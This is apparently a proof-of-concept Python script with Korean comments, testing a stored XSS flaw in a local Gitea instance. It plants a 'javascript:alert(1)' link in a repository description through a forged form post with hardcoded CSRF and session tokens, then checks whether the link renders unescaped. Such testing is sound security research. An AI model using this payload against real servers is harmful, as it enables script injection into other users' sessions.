import re
import requests

# 기본 설정
BASE_URL = "http://localhost:3000"
USERNAME = "user1"  # 사용자 이름 입력
PASSWORD = "user1user1"  # 사용자 비밀번호 입력

CSRF_TOKEN = "joNM8wsDctby4JhcUMCrTzuk8Qo6MTczNzQ3MTY5MzYwMDA3NzcxMw"  # 개발자 도구에서 추출한 CSRF 토큰
GITEA_TOKEN="1ec0c0fc12bc5ec5"

def get_csrf_token(session):
    login_url = f"{BASE_URL}/user/login"
    response = session.get(login_url)
    csrf_token = re.search(r'name="_csrf" value="(.*?)"', response.text)
    if csrf_token:
        return csrf_token.group(1)
    else: 
        print("NOT token")
        return None

# 2. 저장소 생성 요청 보내기
# 1. 새로운 저장소 생성 요청
def create_repository():
    create_repo_url = f"{BASE_URL}/repo/create"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/repo/create",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
    }
    data = {
        "_csrf": CSRF_TOKEN,
        "uid": "1",  # 사용자의 UID
        "repo_name": "repo_py",
        "description": "<a href=javascript:alert(1)>XSS test</a>",
        "repo_template": "",
        "issue_labels": "",
        "gitignores": "",
        "license": "",
        "readme": "Default",
        "default_branch": "main",
        "object_format_name": "sha1"
    }
    cookies = {
        "_csrf": CSRF_TOKEN,
        "i_like_gitea": GITEA_TOKEN,
        "jenkins-timestamper-offset": "-32400000",
        "lang": "en-US"
    }


    # POST 요청 전송
    response = requests.post(create_repo_url, headers=headers, cookies=cookies, data=data)

    # 응답 결과 확인
    if response.status_code == 200 or response.status_code == 303:
        print("Repository created successfully!")
    else:
        print(f"Failed to create repository. Status code: {response.status_code}")
        print("Response text:", response.text)

# 3. 저장소 페이지에서 XSS 페이로드 확인하기
def verify_exploit(session):
    repo_page_url = f"{BASE_URL}/{USERNAME}"
    response = session.get(repo_page_url)
    with open("response_debug.html", "w", encoding="utf-8") as file:
            file.write(response.text)
    # print(response.text)
    if """<a href="javascript:alert(1)">""" in response.text:
        print("Exploit complete: XSS payload found on the repository page.")
    else:
        print("Exploit failed: XSS payload not found.")

# 전체 과정 실행하기
def main():
    with requests.Session() as session:
        # 1. 로그인 및 CSRF 토큰 획득
        csrf_token = get_csrf_token(session)
        print("CSRF Token obtained:", csrf_token)

        # 2. 저장소 생성
        # create_repository(session, csrf_token)
        create_repository()

        # 3. XSS 페이로드 확인
        verify_exploit(session)

if __name__ == "__main__":
    main()
